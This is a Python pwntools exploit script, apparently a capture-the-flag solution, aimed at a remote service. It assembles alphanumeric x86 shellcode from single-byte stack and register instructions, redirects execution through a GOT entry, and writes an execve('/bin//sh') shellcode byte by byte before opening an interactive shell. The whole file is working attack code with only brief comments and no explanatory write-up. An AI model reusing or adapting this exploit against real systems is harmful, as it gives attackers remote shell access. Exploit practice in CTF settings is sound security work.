from pwn import *
#p=process("./dd")
p=remote("magic.420blaze.in", 420)
payload=""
payload+="\x4c"*5#dec esp
payload+="\x54"#push esp
payload+="\x4c"*4
payload+="\x5f" #pop edi
payload+="\x44"*4
payload+="\x4c"*3 # dec esp
payload+="\x5b" # pop ebx
payload+="\x4c" # dec esp
payload+="\x4b"*5 #dec ebx
#payload+="\x44"
payload+="\x53" #push ebx
payload+="\x4c" # dec esp 
payload+="\x5c" # pop esp

#successful!

payload+="\x59" #pop esi
payload+="\x5e" #pop esi, is now 0x25
payload+="\x5b" #pop ecx
payload+="\x5b" #pop ebx
payload+="\x4c"*4#dec

payload+="\x44"#inc
payload+="\x58"#pop eax
payload+="\x4c"#dec

payload+="\x5e" #pop ecx
payload+="\x5e" #pop ecx
payload+="\x5d"#pop ebp (junk)
payload+="\x5a"#pop edx
payload+="\x5d"
payload+="\x5d"

payload+="\x4a"*0x10#dec edx
payload+="\x4b"*0xb#dec ebx
'''
payload+="\x5e" #pop esi
payload+="\x5e" #pop esi, is now 0x25
payload+="\x59" #pop ecx
payload+="\x59" #pop ecx
payload+="\x59" #pop ecx, 0xbc
payload+="\x5d"#pop ebp (junk)
payload+="\x5d"
payload+="\x5d"
payload+="\x5d"'''
payload+="\x48"*2#dec eax

payload+="\x46"*8#inc esi
payload+="\x49"*0xc#dec ecx
payload+="\x47"*4#inc edi

#payload+="\x56"#push esi
payload+="\x53"#push ebx
payload+="\x5d"+"\x44"#junk, 5 bytes
#payload+="\x51"#push ecx
payload+="\x50"#push eax
payload+="\x5d"+"\x44"#junk, 5 bytes
payload+="\x57"#push edi
payload+="\x47"*4#inc edi
payload+="\x5d"+"\x44"#junk, 5 bytes
payload+="\x57"#push edi
payload+="\x4c"*3 # dec esp 
payload+="\x58"#exit got loaded into eax!#08048750

payload+="\x44"*8
#payload+="\x43"*(0xe+36+0x10-2)
payload+="\x4b"*(3)
payload+="\x53"#push ebx
payload+="\x44"*8#inc esp
payload+="\x50"#push eax
payload+="\x44"
payload+="\x5b"#pop ebx
payload+="\x43"#pop ebx
payload+="\x4c"*4#dec esp
payload+="\x53"#pop ebx


payload+="\x4c"#dec esp
payload+="\x5b"#dec esp

payload+="\x44"*8



payload+="\x56"#push esi
#payload+="\x53"#push ebx
payload+="\x5d"+"\x44"#junk, 5 bytes
payload+="\x51"#push ecx
#payload+="\x50"#push eax
payload+="\x5d"+"\x44"#junk, 5 bytes
payload+="\x4f"*4#dec edi
payload+="\x57"#push edi
payload+="\x5d"+"\x44"#junk, 5 bytes
payload+="\x47"*4#inc edi
payload+="\x57"#push edi
payload+="\x4c"*3 # dec esp 
#payload+="\x5c"#exit got loaded into esp!#08048750
payload+="\x44"*8
payload+="\x54"#push esp
payload+="\x59"#pop ecx, now saved esp in ecx
payload+="\x4c"*8
payload+="\x5c"#pop esp

payload+="\x50"#push eax
payload+="\x44"*8#inc esp
payload+="\x53"#push ebx
payload+="d"
print payload
p.sendline(payload)
p.sendline("d")
p.sendline("d")

payload=""
payload+="\x44"*20#inc esp
payload+="\x51"#push ecx
payload+="\x5c"#pop esp
payload+="d"

print payload
p.sendline(payload)
payload="\x44"*8
payload+="\x50"#push eax, which has got address in it
payload+="\x44"#inc esp
payload+="\x5b"#pop ebx, #0804b01c is strcat

#payload+="\x43"*(0xb0-)#inc ebx\
payload+="\x4b"#dec ebx to 0x80486
payload+="\x4e"*(4)#dec esi to 0x24
payload+="\x44"*5
payload+="\x56"#push esi
payload+="\x44"*5
payload+="\x53"

payload+="\x4c"
payload+="\x5e"#pop to esi
#payload+="\x4b"*(0x4b-0x28+2)#dec ebx to 0x80486
payload+="\x5d"#pop to ebp
payload+="\x4c"*(0x4e-0x34)
payload+="\x5d"#pop to ebp
payload+="\x4d"*8#dec ebp
payload+="\x55"#push ebp
payload+="\x5c"#pop esp
payload+="\x56"#push esi
payload+="D"*20#push esi
payload+="\x51"#push ecx
payload+="\x5c"#pop esp
payload+="d"
print payload, len(payload)
p.sendline(payload)

#BYTE 1
payload=""
payload+="\x47"*(0x31-0x8)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 2
payload=""
payload+="\x47"*(0xc9-0x31)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 3
payload=""
payload+="\x47"*(0xf7-0xc9)#dec edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 4
payload=""
payload+="\x4f"*(0xf7-0xe1)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 5
payload=""
payload+="\x4f"*(0xe1-0x51)#dec edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 6
payload=""
payload+="\x47"*(0x68-0x51)#dec edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 7
payload=""
payload+="\x4f"*(0x68-0x2f)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 8
payload=""
payload+="\x4f"*(0)#dec edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 9
payload=""
payload+="\x47"*(0x73-0x2f)#dec edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 10
payload=""
payload+="\x4f"*(0x73-0x68)#dec edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 11
payload=""
payload+="\x47"*(0)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 12
payload=""
payload+="\x4f"*(0x68-0x2f)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 13
payload=""
payload+="\x47"*(0x62-0x2f)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 14
payload=""
payload+="\x47"*(0x69-0x62)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 15
payload=""
payload+="\x47"*(0x6e-0x69)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 16
payload=""
payload+="\x47"*(0x89-0x6e)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 17
payload=""
payload+="\x47"*(0xe3-0x89)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 18
payload=""
payload+="\x4f"*(0xe3-0xb0)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 19
payload=""
payload+="\x4f"*(0xb0-0x0b)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 20
payload=""
payload+="\x47"*(0xcd-0x0b)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)

#BYTE 21
payload=""
payload+="\x4f"*(0xcd-0x80)#inc edi
payload+="\x57"#push edi
payload+="\x44"*5#inc esp
payload+="d"

print payload
p.sendline(payload)


payload=""
payload+="\x4c"*(0x4f-0x1a-2)#inc edi
payload+="\x4f"*(0x80-0x1f+5)#dec edi
payload+="\x57"
#gdb.attach(p)
p.sendline(payload)


p.interactive()